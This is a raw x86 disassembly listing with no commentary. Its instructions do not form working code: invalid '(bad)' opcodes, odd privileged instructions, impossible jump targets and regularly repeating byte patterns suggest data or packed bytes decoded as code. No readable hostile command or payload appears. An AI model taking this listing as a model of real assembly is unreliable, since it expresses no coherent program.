  40cfa2:	jae    0x40cf36
  40cfa4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cfa5:	jp     0x40cfba
  40cfa7:	bound  esi,QWORD PTR [edi+0x38]
  40cfaa:	test   al,0xc7
  40cfac:	pop    ebx
  40cfad:	push   ss
  40cfae:	add    eax,0x12bd9e79
  40cfb3:	scas   al,BYTE PTR es:[edi]
  40cfb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cfb5:	xchg   esp,eax
  40cfb6:	xor    DWORD PTR [eax*1-0xe994068],esi
  40cfbd:	aaa    
  40cfbe:	inc    eax
  40cfbf:	pop    ds
  40cfc0:	xchg   BYTE PTR [edx+0x42],ah
  40cfc3:	inc    ecx
  40cfc4:	push   ebx
  40cfc5:	bound  eax,QWORD PTR [ebx+0x40]
  40cfc8:	adc    BYTE PTR ds:0x4158cc40,al
  40cfce:	inc    ebx
  40cfcf:	bound  eax,QWORD PTR [ecx+0x40]
  40cfd2:	add    eax,0x4140
  40cfd7:	and    eax,0x40400062
  40cfdc:	add    eax,0x84404340
  40cfe1:	int3   
  40cfe2:	js     0x40cfe4
  40cfe4:	inc    ecx
  40cfe5:	adc    BYTE PTR [edx+0xf],ah
  40cfe8:	jg     0x40d03b
  40cfea:	push   0x60
  40cfec:	mov    esi,0x11e3437f
  40cff1:	cmp    esp,DWORD PTR [ebx-0x63]
  40cff4:	inc    eax
  40cff5:	add    BYTE PTR [eax],dh
  40cff7:	sbb    eax,0x5ce6d47
  40cffc:	arpl   WORD PTR [eax],ax
  40cffe:	inc    eax
  40cfff:	inc    ecx
  40d000:	inc    eax
  40d001:	inc    ebx
  40d002:	bound  ax,DWORD PTR ds:0x40434100
  40d009:	add    eax,0x40054062
  40d00e:	bound  eax,QWORD PTR [ecx+0x40]
  40d011:	inc    ebx
  40d012:	inc    eax
  40d013:	add    eax,0x25405841
  40d018:	bound  eax,QWORD PTR [eax+0x43]
  40d01b:	inc    eax
  40d01c:	adc    BYTE PTR [edx-0x78],ah
  40d01f:	xchg   al,dl
  40d021:	pop    edi
  40d022:	lock xchg bl,bl
  40d025:	scas   al,BYTE PTR es:[edi]
  40d026:	inc    eax
  40d027:	inc    ebp
  40d028:	ins    DWORD PTR es:[edi],dx
  40d029:	outs   dx,DWORD PTR ds:[esi]
  40d02a:	bound  eax,QWORD PTR ds:0x4a3181d8
  40d030:	dec    esi
  40d031:	xchg   edi,eax
  40d032:	add    al,0x9c
  40d034:	dec    esi
  40d035:	mov    eax,0x48d15d6c
  40d03a:	lods   al,BYTE PTR ds:[esi]
  40d03b:	add    eax,0x41403558
  40d040:	inc    ebx
  40d041:	inc    eax
  40d042:	add    eax,0x43406262
  40d047:	inc    ecx
  40d048:	adc    BYTE PTR [eax],al
  40d04a:	inc    eax
  40d04b:	add    eax,0x43000562
  40d050:	add    BYTE PTR [ecx+0x40],al
  40d053:	inc    eax
  40d054:	add    eax,0x400062
  40d059:	inc    ebx
  40d05a:	inc    eax
  40d05b:	js     0x40d09e
  40d05d:	inc    ecx
  40d05e:	bound  eax,QWORD PTR [eax+0x42]
  40d061:	lods   eax,DWORD PTR ds:[esi]
  40d062:	sub    bl,BYTE PTR [ebp-0x343e7958]
  40d068:	inc    ebx
  40d069:	or     esi,ebx
  40d06b:	dec    eax
  40d06c:	mov    dl,0x9
  40d06e:	adc    BYTE PTR [edi-0x60e4a62f],bh
  40d074:	inc    ecx
  40d075:	fwait
  40d076:	dec    esp
  40d077:	or     eax,0x4845df6c
  40d07c:	add    ax,0xc861
  40d080:	rol    DWORD PTR [esi-0x79ff604f],1
  40d086:	loop   0x40d0d0
  40d088:	aam    0xff
  40d08a:	fs dec eax
  40d08c:	bound  eax,QWORD PTR [eax+0x5]
  40d08f:	inc    ecx
  40d090:	add    BYTE PTR [ebx+0x40],al
  40d093:	inc    eax
  40d094:	inc    ecx
  40d095:	inc    eax
  40d096:	inc    eax
  40d097:	bound  eax,QWORD PTR ds:0x5624300
  40d09d:	add    BYTE PTR [eax+0x40],al
  40d0a0:	add    BYTE PTR [ecx+0x43],al
  40d0a3:	add    BYTE PTR [eax+0x41],al
  40d0a6:	add    eax,0x40436200
  40d0ab:	inc    eax
  40d0ac:	add    eax,0x5b136362
  40d0b1:	retf   0xb37
  40d0b4:	mov    ch,0x9f
  40d0b6:	mov    al,0x9a
  40d0b8:	retf   
  40d0b9:	mov    ah,0x41
  40d0bb:	add    BYTE PTR [esi+0x48],bh
  40d0be:	add    eax,0x47058405
  40d0c3:	rcl    DWORD PTR [ecx],1
  40d0c5:	lahf   
  40d0c6:	push   0x24cbb186
  40d0cb:	sub    eax,DWORD PTR [ebp+0x48]
  40d0ce:	mov    edx,0x847b530d
  40d0d3:	inc    esi
  40d0d4:	xor    DWORD PTR [edi+0x40419954],ebx
  40d0da:	add    eax,0x41624340
  40d0df:	test   BYTE PTR [eax],al
  40d0e1:	and    eax,0x404043
  40d0e6:	add    BYTE PTR ds:0x626210,al
  40d0ec:	add    eax,0x43404140
  40d0f1:	inc    eax
  40d0f2:	inc    ecx
  40d0f3:	add    eax,0x10664062
  40d0f8:	inc    ebx
  40d0f9:	bound  ebp,QWORD PTR [ebx+ecx*2-0x40bc58c0]
  40d100:	clc    
  40d101:	add    eax,0x8a315e00
  40d106:	push   ecx
  40d107:	imul   ebp,DWORD PTR [esi+0x6cc4d186],0xffffffaa
  40d10e:	pop    ds
  40d10f:	pop    ds
  40d110:	pushaw 
  40d112:	mov    cl,BYTE PTR [edi+ebx*2-0x1c]
  40d116:	jae    0x40d183
  40d118:	add    bl,BYTE PTR [eax-0x1ebcea57]
  40d11e:	inc    ecx
  40d11f:	pop    ds
  40d120:	add    ax,0xc9b8
  40d124:	rol    DWORD PTR [esi-0xe],1
  40d127:	dec    edi
  40d128:	lods   al,BYTE PTR ds:[esi]
  40d129:	xchg   BYTE PTR [edx+0x41],ah
  40d12c:	mov    WORD PTR ds:0x4041cc,es
  40d132:	add    BYTE PTR [eax],al
  40d134:	inc    eax
  40d135:	inc    eax
  40d136:	inc    ebx
  40d137:	bound  eax,QWORD PTR [eax]
  40d139:	inc    eax
  40d13a:	inc    eax
  40d13b:	add    eax,0x62434162
  40d140:	inc    eax
  40d141:	js     0x40d153
  40d143:	inc    ecx
  40d144:	add    eax,0x5404325
  40d149:	bound  eax,QWORD PTR [eax+0x40]
  40d14c:	inc    ecx
  40d14d:	inc    ebx
  40d14e:	stc    
  40d14f:	add    al,0x92
  40d151:	pop    esi
  40d152:	jnp    0x40d1bf
  40d154:	stos   BYTE PTR es:[edi],al
  40d155:	cmp    eax,0x816ebe9f
  40d15a:	xchg   edi,eax
  40d15b:	(bad)  
  40d15d:	add    ebp,DWORD PTR [edi]
  40d15f:	push   ebx
  40d160:	dec    ecx
  40d161:	push   esi
  40d162:	add    eax,0xd8cd4cca
  40d167:	mov    eax,0x8486aa50
  40d16c:	adc    eax,0x2d337728
  40d171:	add    eax,0x62412515
  40d176:	inc    ebx
  40d177:	add    BYTE PTR [eax],dl
  40d179:	inc    eax
  40d17a:	add    BYTE PTR ds:0x62410040,al
  40d180:	inc    eax
  40d181:	add    BYTE PTR [ebx-0x34],al
  40d184:	inc    eax
  40d185:	add    eax,0x78434040
  40d18a:	bound  eax,QWORD PTR [ecx+0x78]
  40d18d:	add    eax,0x62404043
  40d192:	(bad)  
  40d193:	retf   
  40d194:	inc    edx
  40d195:	dec    eax
  40d196:	pop    esp
  40d197:	inc    ebp
  40d198:	inc    ebx
  40d199:	xchg   esi,eax
  40d19a:	ret    0x10b0
  40d19d:	jl     0x40d1d0
  40d19f:	repnz push cs
  40d1a1:	add    eax,0xf084788
  40d1a6:	(bad)  
  40d1a7:	outs   dx,BYTE PTR ds:[esi]
  40d1a8:	push   esp
  40d1a9:	xchg   BYTE PTR [edi],cl
  40d1ab:	bound  ecx,QWORD PTR gs:[edi]
  40d1ae:	aad    0xaa
  40d1b0:	clc    
  40d1b1:	pusha  
  40d1b2:	pushf  
  40d1b3:	sbb    BYTE PTR [eax-0x6d],al
  40d1b6:	addr16 inc esi
  40d1b8:	test   al,0x95
  40d1ba:	adc    esp,DWORD PTR [ebx+0x30]
  40d1bd:	aaa    
  40d1be:	inc    ecx
  40d1bf:	inc    eax
  40d1c0:	add    eax,0x43436240
  40d1c5:	add    eax,0x62004040
  40d1ca:	inc    eax
  40d1cb:	add    BYTE PTR [ecx+0x40],al
  40d1ce:	inc    ebx
  40d1cf:	test   BYTE PTR ds:0x58054041,ah
  40d1d5:	inc    eax
  40d1d6:	inc    eax
  40d1d7:	bound  eax,QWORD PTR [eax+0x66]
  40d1da:	inc    ecx
  40d1db:	inc    eax
  40d1dc:	add    eax,0x15bbf300
  40d1e1:	add    eax,0xfc6cb49c
  40d1e6:	outs   dx,BYTE PTR ds:[esi]
  40d1e7:	inc    edx
  40d1e8:	and    al,BYTE PTR [esi-0xf83fa8c]
  40d1ee:	xor    dh,BYTE PTR [ebx+0x430000af]
  40d1f4:	inc    eax
  40d1f5:	bound  eax,QWORD PTR ds:0x25404110
  40d1fb:	add    ah,cl
  40d1fd:	inc    ebx
  40d1fe:	add    eax,0x40402562
  40d203:	add    BYTE PTR [eax+0x40],al
  40d206:	inc    ecx
  40d207:	inc    ecx
  40d208:	add    eax,0x78434025
  40d20d:	bound  eax,QWORD PTR [eax-0x7c]
  40d210:	inc    eax
  40d211:	inc    ecx
  40d212:	jnp    0x40d249
  40d214:	xor    eax,0x4135f543
  40d219:	fs xchg esp,eax
  40d21b:	fucomp st(2)
  40d21d:	shl    DWORD PTR [eax+0x54],1
  40d220:	push   eax
  40d221:	cli    
  40d222:	add    eax,0x5c2f626f
  40d227:	push   ecx
  40d228:	xor    esp,DWORD PTR [esi-0x28e96f7a]
  40d22e:	(bad)  
  40d22f:	std    
  40d230:	inc    ecx
  40d231:	jns    0x40d266
  40d233:	inc    ecx
  40d234:	xor    al,0xfa
  40d236:	cmp    bl,BYTE PTR [edx]
  40d238:	cmp    ebp,DWORD PTR [edx+0x22405093]
  40d23e:	mov    WORD PTR [ebp+0x42],ss
  40d241:	add    ax,0x414b
  40d245:	inc    eax
  40d246:	inc    eax
  40d247:	inc    ebx
  40d248:	int3   
  40d249:	add    BYTE PTR ds:0x56240,al
  40d24f:	inc    ebx
  40d250:	inc    eax
  40d251:	inc    eax
  40d252:	add    BYTE PTR [ecx+0x62],al
  40d255:	bound  eax,QWORD PTR [eax]
  40d257:	int3   
  40d258:	inc    eax
  40d259:	inc    ebx
  40d25a:	add    eax,0x43624041
  40d25f:	adc    BYTE PTR [ecx+0x5],al
  40d262:	inc    eax
  40d263:	dec    esp
  40d264:	inc    ecx
  40d265:	cmp    BYTE PTR [esi],al
  40d267:	adc    BYTE PTR [esi+eax*4+0x42473dc4],ah
  40d26e:	ss daa 
  40d270:	add    eax,0x24c38437
  40d275:	je     0x40d2b1
  40d277:	bound  eax,QWORD PTR [ebx+0x40]
  40d27a:	adc    BYTE PTR ds:0x4158cc40,al
  40d280:	inc    ebx
  40d281:	bound  eax,QWORD PTR [ecx+0x40]
  40d284:	add    eax,0x4140
  40d289:	and    eax,0x40400062
  40d28e:	add    eax,0x84404340
  40d293:	int3   
  40d294:	js     0x40d296
  40d296:	inc    ecx
  40d297:	adc    BYTE PTR [edx+0xf],ah
  40d29a:	inc    ecx
  40d29b:	outs   dx,BYTE PTR ds:[esi]
  40d29c:	xchg   edx,eax
  40d29d:	lea    ebx,[esp+edi*8]
  40d2a0:	mov    ebp,DWORD PTR [ebx+0x71]
  40d2a3:	ret    0xa805
  40d2a6:	inc    esp
  40d2a7:	inc    eax
  40d2a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d2a9:	rep lods eax,DWORD PTR ds:[esi]
  40d2ab:	push   esp
  40d2ac:	xchg   ah,ch
  40d2ae:	inc    esp
  40d2af:	xor    DWORD PTR ds:0x2ff8246f,edi
  40d2b5:	inc    ebx
  40d2b6:	inc    eax
  40d2b7:	ins    BYTE PTR es:[edi],dx
  40d2b8:	jle    0x40d2b0
  40d2ba:	mov    dl,0xa2
  40d2bc:	xchg   ecx,eax
  40d2bd:	bound  esp,QWORD PTR [edi+0x19]
  40d2c0:	jbe    0x40d2e4
  40d2c2:	and    esp,DWORD PTR [ebx]
  40d2c4:	add    eax,0x400007c2
  40d2c9:	inc    ecx
  40d2ca:	inc    eax
  40d2cb:	inc    ebx
  40d2cc:	bound  ax,DWORD PTR ds:0x40434100
  40d2d3:	add    eax,0x40054062
  40d2d8:	bound  eax,QWORD PTR [ecx+0x40]
  40d2db:	inc    ebx
  40d2dc:	inc    eax
  40d2dd:	add    eax,0x25405841
  40d2e2:	bound  eax,QWORD PTR [eax+0x43]
  40d2e5:	inc    eax
  40d2e6:	adc    BYTE PTR [ebx-0x3c],al
  40d2e9:	push   0x3486fe42
  40d2ee:	cld    
  40d2ef:	shr    edi,1
  40d2f1:	push   ecx
  40d2f2:	lock data16 and al,0x65
  40d2f6:	bound  edi,QWORD PTR [eax]
  40d2f8:	std    
  40d2f9:	data16 sub ah,BYTE PTR [eax+0x7d414790]
  40d300:	stos   DWORD PTR es:[edi],eax
  40d301:	aad    0x40
  40d303:	pop    ebp
  40d304:	inc    eax
  40d305:	inc    ecx
  40d306:	inc    ebx
  40d307:	inc    eax
  40d308:	add    eax,0x43406262
  40d30d:	inc    ecx
  40d30e:	adc    BYTE PTR [eax],al
  40d310:	inc    eax
  40d311:	add    eax,0x43000562
  40d316:	add    BYTE PTR [ecx+0x40],al
  40d319:	inc    eax
  40d31a:	add    eax,0x400062
  40d31f:	inc    ebx
  40d320:	inc    eax
  40d321:	js     0x40d364
  40d323:	inc    ecx
  40d324:	bound  eax,QWORD PTR [eax+0x5]
  40d327:	add    eax,0x9bb3c8bc
  40d32c:	das    
  40d32d:	cmp    eax,0x9f7a2586
  40d332:	call   0x2e97945b
  40d337:	addr16 mov ah,0x28
  40d33a:	int    0x12
  40d33c:	push   ecx
  40d33d:	inc    eax
  40d33e:	(bad)  
  40d33f:	and    BYTE PTR ds:0x44293d42,cl
  40d345:	inc    eax
  40d346:	add    eax,0x4310c94d
  40d34b:	add    DWORD PTR [eax+eax*2-0x7a],edx
  40d34f:	test   BYTE PTR [edx+0x50],al
  40d352:	ja     0x40d347
  40d354:	jecxz  0x40d3b8
  40d356:	inc    eax
  40d357:	add    eax,0x40430041
  40d35c:	inc    eax
  40d35d:	inc    ecx
  40d35e:	inc    eax
  40d35f:	inc    eax
  40d360:	bound  eax,QWORD PTR ds:0x5624300
  40d366:	add    BYTE PTR [eax+0x40],al
  40d369:	add    BYTE PTR [ecx+0x43],al
  40d36c:	add    BYTE PTR [eax+0x41],al
  40d36f:	add    eax,0x40436200
  40d374:	inc    eax
  40d375:	add    eax,0x7d29ea62
  40d37a:	inc    ecx
  40d37b:	(bad)
  40d380:	mov    ?,WORD PTR [esi+0x41]
  40d383:	inc    eax
  40d384:	fs push ecx
  40d386:	inc    eax
  40d387:	lahf   
  40d388:	add    eax,0xb530bc53
  40d38d:	push   esp
  40d38e:	push   ecx
  40d38f:	enter  0xb886,0x41
  40d393:	inc    eax
  40d394:	add    eax,0x41624340
  40d399:	test   BYTE PTR [eax],al
  40d39b:	and    eax,0x404043
  40d3a0:	add    BYTE PTR ds:0x626210,al
  40d3a6:	add    eax,0x43404140
  40d3ab:	inc    eax
  40d3ac:	inc    ecx
  40d3ad:	add    eax,0x10664062
  40d3b2:	inc    ebx
  40d3b3:	bound  esi,QWORD PTR [esi+0x6c]
  40d3b6:	pop    ecx
  40d3b7:	aaa    
  40d3b8:	inc    edx
  40d3b9:	add    edx,DWORD PTR [edi]
  40d3bb:	jge    0x40d3b4
  40d3bd:	add    DWORD PTR ss:[edx-0x10],eax
  40d3c1:	cmp    al,0x8d
  40d3c3:	jne    0x40d406
  40d3c5:	inc    ebx
  40d3c6:	out    0x7d,eax
  40d3c8:	outs   dx,DWORD PTR ds:[esi]
  40d3c9:	arpl   WORD PTR ds:0x3ad1bd44,ax
  40d3cf:	push   eax
  40d3d0:	pop    edi
  40d3d1:	push   ebx
  40d3d2:	xchg   BYTE PTR [eax+0x5],dl
  40d3d5:	int3   
  40d3d6:	inc    ecx
  40d3d7:	inc    eax
  40d3d8:	add    BYTE PTR [eax],al
  40d3da:	add    BYTE PTR [eax+0x40],al
  40d3dd:	inc    ebx
  40d3de:	bound  eax,QWORD PTR [eax]
  40d3e0:	inc    eax
  40d3e1:	inc    eax
  40d3e2:	add    eax,0x62434162
  40d3e7:	inc    eax
  40d3e8:	js     0x40d3fa
  40d3ea:	inc    ecx
  40d3eb:	add    eax,0x5404325
  40d3f0:	bound  eax,QWORD PTR [eax+0x40]
  40d3f3:	inc    ecx
  40d3f4:	inc    ebx
  40d3f5:	dec    ebp
  40d3f6:	sub    esi,ebx
  40d3f8:	pop    edi
  40d3f9:	push   eax
  40d3fa:	test   al,0x68
  40d3fc:	lds    esp,FWORD PTR [eax+0x27]
  40d3ff:	mov    al,0x39
  40d401:	jp     0x40d475
  40d403:	mov    WORD PTR [eax+0x78],es
  40d406:	aaa    
  40d407:	mov    al,0x25
  40d409:	inc    ecx
  40d40a:	bound  eax,QWORD PTR [ebx+0x0]
  40d40d:	adc    BYTE PTR [eax+0x0],al
  40d410:	add    eax,0x62410040
  40d415:	inc    eax
  40d416:	add    BYTE PTR [ebx-0x34],al
  40d419:	inc    eax
  40d41a:	add    eax,0x78434040
  40d41f:	bound  eax,QWORD PTR [ecx+0x78]
  40d422:	add    eax,0x62404043
  40d427:	cmc    
  40d428:	push   edi
  40d429:	ds add eax,0x576dd8a9
  40d42f:	call   DWORD PTR [eax+0x546986c6]
  40d435:	inc    ecx
  40d436:	stos   DWORD PTR es:[edi],eax
  40d437:	dec    ebp
  40d438:	xor    al,0x94
  40d43a:	pusha  
  40d43b:	fs mov ah,0x43
  40d43e:	stos   BYTE PTR es:[edi],al
  40d43f:	cwde   
  40d440:	sub    ah,bl
  40d442:	mov    eax,DWORD PTR [edi+0x41]
  40d445:	xor    BYTE PTR [ebp+0x53c4d3a],cl
  40d44b:	jmp    0x5b3fc90d
  40d450:	icebp  
  40d451:	mov    ebx,0x40762a86
  40d456:	jge    0x40d449
  40d458:	data16 and al,0x70
  40d45b:	or     DWORD PTR [ecx+0x40],eax
  40d45e:	add    eax,0x43436240
  40d463:	add    eax,0x62004040
  40d468:	inc    eax
  40d469:	add    BYTE PTR [ecx+0x40],al
  40d46c:	inc    ebx
  40d46d:	test   BYTE PTR ds:0x58054041,ah
  40d473:	inc    eax
  40d474:	inc    eax
  40d475:	bound  eax,QWORD PTR [eax+0x66]
  40d478:	inc    ecx
  40d479:	inc    eax
  40d47a:	add    eax,0xb4315100
  40d47f:	dec    esi
  40d480:	popf   
  40d481:	inc    esi
  40d482:	mov    dh,cl
  40d484:	int3   
  40d485:	ins    BYTE PTR es:[edi],dx
  40d486:	(bad)  
  40d487:	adc    eax,DWORD PTR [ebp-0x4]
  40d48a:	add    eax,0x56d36d63
  40d48f:	or     eax,0xbc866cb3
  40d494:	sub    BYTE PTR [edx-0x40],cl
  40d497:	adc    cl,BYTE PTR [edx]
  40d499:	outs   dx,BYTE PTR ds:[si]
  40d49b:	sub    eax,0x27e5d968
  40d4a0:	mov    bl,0x58
  40d4a2:	mov    DWORD PTR [eax],eax
  40d4a4:	add    BYTE PTR [ebx+0x40],al
  40d4a7:	bound  eax,QWORD PTR ds:0x25404110
  40d4ad:	add    ah,cl
  40d4af:	inc    ebx
  40d4b0:	add    eax,0x40402562
  40d4b5:	add    BYTE PTR [eax+0x40],al
  40d4b8:	inc    ecx
  40d4b9:	inc    ecx
  40d4ba:	add    eax,0x78434025
  40d4bf:	bound  eax,QWORD PTR [eax-0x7c]
  40d4c2:	inc    eax
  40d4c3:	inc    ecx
  40d4c4:	add    DWORD PTR [eax+0x43511df5],esi
  40d4ca:	gs add eax,0x5a40c364
  40d4d0:	xor    DWORD PTR [ecx-0x4c],esi
  40d4d3:	xchg   BYTE PTR [ecx],dl
  40d4d5:	mov    eax,0x5a18f34c
  40d4da:	inc    ecx
  40d4db:	jne    0x40d483
  40d4dd:	add    eax,0xf2f59b12
  40d4e2:	lods   eax,DWORD PTR ds:[esi]
  40d4e3:	mov    BYTE PTR [ebp-0x4eabe35],ch
  40d4e9:	ins    DWORD PTR es:[edi],dx
  40d4ea:	test   BYTE PTR ds:0x40438252,0x6b
  40d4f1:	push   ebx
  40d4f2:	jp     0x40d47a
  40d4f4:	les    ebp,FWORD PTR [ebx+0x4041dd30]
  40d4fa:	inc    eax
  40d4fb:	inc    ebx
  40d4fc:	int3   
  40d4fd:	add    BYTE PTR ds:0x56240,al
  40d503:	inc    ebx
  40d504:	inc    eax
  40d505:	inc    eax
  40d506:	add    BYTE PTR [ecx+0x62],al
  40d509:	bound  eax,QWORD PTR [eax]
  40d50b:	int3   
  40d50c:	inc    eax
  40d50d:	inc    ebx
  40d50e:	add    eax,0x43624041
  40d513:	adc    BYTE PTR [ecx+0x5],al
  40d516:	inc    eax
  40d517:	pop    ss
  40d518:	push   ecx
  40d519:	popa   
  40d51a:	outs   dx,DWORD PTR ds:[esi]
  40d51b:	add    BYTE PTR [eax+esi*8-0x65],0x42
  40d520:	mov    ebp,0xc0c78762
  40d525:	inc    eax
  40d526:	fst    st(3)
  40d528:	popa   
  40d529:	fs add eax,0xcc3174a8
  40d52f:	inc    ebx
  40d530:	icebp  
  40d531:	in     al,dx
  40d532:	xchg   BYTE PTR [edx],al
  40d534:	ins    BYTE PTR es:[di],dx
  40d536:	push   cs
  40d537:	jno    0x40d570
  40d539:	add    esp,DWORD PTR [ecx]
  40d53b:	iret   
  40d53c:	mov    eax,0x404362f0
  40d541:	adc    BYTE PTR ds:0x4158cc40,al
  40d547:	inc    ebx
  40d548:	bound  eax,QWORD PTR [ecx+0x40]
  40d54b:	add    eax,0x4140
  40d550:	and    eax,0x40400062
  40d555:	add    eax,0x84404340
  40d55a:	int3   
  40d55b:	js     0x40d55d
  40d55d:	inc    ecx
  40d55e:	adc    BYTE PTR [edx+0xf],ah
  40d561:	out    0x40,eax
  40d563:	mov    cl,0x82
  40d565:	xchg   BYTE PTR [edx+0xd],ah
  40d568:	pop    esp
  40d569:	adc    ah,BYTE PTR cs:[ecx+0x6f]
  40d56d:	add    eax,0x30fdc926
  40d572:	or     DWORD PTR [ecx-0x56],edx
  40d575:	add    BYTE PTR [eax+0x41],al
  40d578:	inc    eax
  40d579:	inc    ebx
  40d57a:	bound  ax,DWORD PTR ds:0x40434100
  40d581:	add    eax,0x40054062
  40d586:	bound  eax,QWORD PTR [ecx+0x40]
  40d589:	inc    ebx
  40d58a:	inc    eax
  40d58b:	add    eax,0x25405841
  40d590:	bound  eax,QWORD PTR [eax+0x43]
  40d593:	inc    eax
  40d594:	adc    BYTE PTR [esi+0x43a34035],al
  40d59a:	inc    esp
  40d59b:	jg     0x40d5ff
  40d59d:	sub    al,0x3d
  40d59f:	add    DWORD PTR [eax+0x64f1d0bb],ebp
  40d5a5:	test   edx,edi
  40d5a7:	and    BYTE PTR [ecx-0x19],dl
  40d5aa:	cmovl  ebp,DWORD PTR [eax*1+0x4543b863]
  40d5b2:	inc    edx
  40d5b3:	rcl    DWORD PTR [eax-0x7a],1
  40d5b6:	xchg   edx,eax
  40d5b7:	lds    esi,FWORD PTR [ebx]
  40d5b9:	push   edx
  40d5ba:	shl    BYTE PTR [esi],1
  40d5bc:	int3   
  40d5bd:	sub    al,0xbf
  40d5bf:	dec    esp
  40d5c0:	in     al,dx
  40d5c1:	inc    eax
  40d5c2:	inc    ecx
  40d5c3:	inc    ebx
  40d5c4:	inc    eax
  40d5c5:	add    eax,0x43406262
  40d5ca:	inc    ecx
  40d5cb:	adc    BYTE PTR [eax],al
  40d5cd:	inc    eax
  40d5ce:	add    eax,0x43000562
  40d5d3:	add    BYTE PTR [ecx+0x40],al
  40d5d6:	inc    eax
  40d5d7:	add    eax,0x400062
  40d5dc:	inc    ebx
  40d5dd:	inc    eax
  40d5de:	js     0x40d621
  40d5e0:	inc    ecx
  40d5e1:	bound  eax,QWORD PTR [eax-0x36]
  40d5e4:	mov    ch,0x33
  40d5e6:	rol    DWORD PTR [edx+eax*1+0x42564073],1
  40d5ed:	dec    ecx
  40d5ee:	rol    DWORD PTR ds:0x2e31404a,1
  40d5f4:	fist   WORD PTR [ecx+0x486286a8]
  40d5fa:	ins    BYTE PTR es:[edi],dx
  40d5fb:	and    BYTE PTR [ebx+0x43],dh
  40d5fe:	inc    edx
  40d5ff:	bound  eax,QWORD PTR [eax+0x5]
  40d602:	inc    ecx
  40d603:	add    BYTE PTR [ebx+0x40],al
  40d606:	inc    eax
  40d607:	inc    ecx
  40d608:	inc    eax
  40d609:	inc    eax
  40d60a:	bound  eax,QWORD PTR ds:0x5624300
  40d610:	add    BYTE PTR [eax+0x40],al
  40d613:	add    BYTE PTR [ecx+0x43],al
  40d616:	add    BYTE PTR [eax+0x41],al
  40d619:	add    eax,0x40436200
  40d61e:	inc    eax
  40d61f:	add    eax,0x79692962
  40d624:	lea    eax,[eax-0x7cd5afbe]
  40d62a:	cmp    al,0x80
  40d62c:	(bad)  
  40d62d:	xchg   ebx,eax
  40d62e:	aam    0xbf
  40d630:	inc    eax
  40d631:	add    eax,0x41f16238
  40d636:	add    ch,BYTE PTR [edi]
  40d638:	sub    al,BYTE PTR [esi+0x1339b81f]
  40d63e:	inc    eax
  40d63f:	push   es
  40d640:	inc    ebx
  40d641:	cmp    ah,BYTE PTR [ebp+0x40418105]
  40d647:	add    eax,0x41624340
  40d64c:	test   BYTE PTR [eax],al
  40d64e:	and    eax,0x404043
  40d653:	add    BYTE PTR ds:0x626210,al
  40d659:	add    eax,0x43404140
  40d65e:	inc    eax
  40d65f:	inc    ecx
  40d660:	add    eax,0x10664062
  40d665:	inc    ebx
  40d666:	bound  esp,QWORD PTR [eax+edx*4]
  40d669:	xor    dh,BYTE PTR [eax]
  40d66b:	adc    dh,0x73
  40d66e:	not    DWORD PTR ss:[edi]
  40d671:	aaa    
  40d672:	dec    eax
  40d673:	add    eax,0x2c434243
  40d678:	inc    eax
  40d679:	inc    esp
  40d67a:	bound  eax,QWORD PTR [esi+0x6633fe0e]
  40d680:	jb     0x40d652
  40d682:	es das 
  40d684:	sbb    DWORD PTR [edi-0x18],ecx
  40d687:	ds call 0x63c2c291
  40d68d:	mov    ah,0x44
  40d68f:	retf   0x7941
  40d692:	add    eax,0x4041cc
  40d697:	add    BYTE PTR [eax],al
  40d699:	inc    eax
  40d69a:	inc    eax
  40d69b:	inc    ebx
  40d69c:	bound  eax,QWORD PTR [eax]
  40d69e:	inc    eax
  40d69f:	inc    eax
  40d6a0:	add    eax,0x62434162
  40d6a5:	inc    eax
  40d6a6:	js     0x40d6b8
  40d6a8:	inc    ecx
  40d6a9:	add    eax,0x5404325
  40d6ae:	bound  eax,QWORD PTR [eax+0x40]
  40d6b1:	inc    ecx
  40d6b2:	inc    ebx
  40d6b3:	bound  eax,QWORD PTR ds:0x4351152a
  40d6b9:	mov    al,ds:0x2c866f11
  40d6be:	retf   
  40d6bf:	imul   edx,DWORD PTR [ebp+0xf],0x33
  40d6c3:	inc    edx
  40d6c4:	or     eax,0x9ab04862
  40d6c9:	inc    eax
  40d6ca:	cmp    cl,ah
  40d6cc:	and    BYTE PTR [esi],0xa9
  40d6cf:	stos   BYTE PTR es:[edi],al
  40d6d0:	scas   al,BYTE PTR es:[edi]
  40d6d1:	adc    al,0x7a
  40d6d3:	addr16 add eax,0x48438174
  40d6d9:	inc    esp
  40d6da:	push   ss
  40d6db:	jns    0x40d663
  40d6dd:	arpl   WORD PTR [eax+0x5232c5d2],di
  40d6e3:	popa   
  40d6e4:	and    eax,0x436241
  40d6e9:	adc    BYTE PTR [eax+0x0],al
  40d6ec:	add    eax,0x62410040
  40d6f1:	inc    eax
  40d6f2:	add    BYTE PTR [ebx-0x34],al
  40d6f5:	inc    eax
  40d6f6:	add    eax,0x78434040
  40d6fb:	bound  eax,QWORD PTR [ecx+0x78]
  40d6fe:	add    eax,0x62404043
  40d703:	inc    eax
  40d704:	ins    DWORD PTR es:[edi],dx
  40d705:	or     eax,0x63724fe8
  40d70a:	(bad)  
  40d70b:	inc    DWORD PTR [ebx+ecx*8+0x5a]
  40d70f:	add    BYTE PTR [edx+ecx*8+0x63],0x5
  40d714:	arpl   WORD PTR [ecx+0x3c],bp
  40d717:	cs inc ecx
  40d719:	inc    eax
  40d71a:	add    eax,0x43436240
  40d71f:	add    eax,0x62004040
  40d724:	inc    eax
  40d725:	add    BYTE PTR [ecx+0x40],al
  40d728:	inc    ebx
  40d729:	test   BYTE PTR ds:0x58054041,ah
  40d72f:	inc    eax
  40d730:	inc    eax
  40d731:	bound  eax,QWORD PTR [eax+0x66]
  40d734:	inc    ecx
  40d735:	inc    eax
  40d736:	add    eax,0x44252100
  40d73b:	xchg   dl,dl
  40d73d:	dec    ebp
  40d73e:	xchg   esp,eax
  40d73f:	test   eax,0x69e4ad43
  40d744:	test   eax,0x6023413f
  40d749:	and    DWORD PTR [esi+edi*8+0xc],esi
  40d74d:	enter  0xd243,0xcb
  40d751:	stos   BYTE PTR es:[edi],al
  40d752:	sbb    BYTE PTR ds:0x30c2ea,al
  40d758:	add    BYTE PTR [ebx+0x40],al
  40d75b:	bound  eax,QWORD PTR ds:0x25404110
  40d761:	add    ah,cl
  40d763:	inc    ebx
  40d764:	add    eax,0x40402562
  40d769:	add    BYTE PTR [eax+0x40],al
  40d76c:	inc    ecx
  40d76d:	inc    ecx
  40d76e:	add    eax,0x78434025
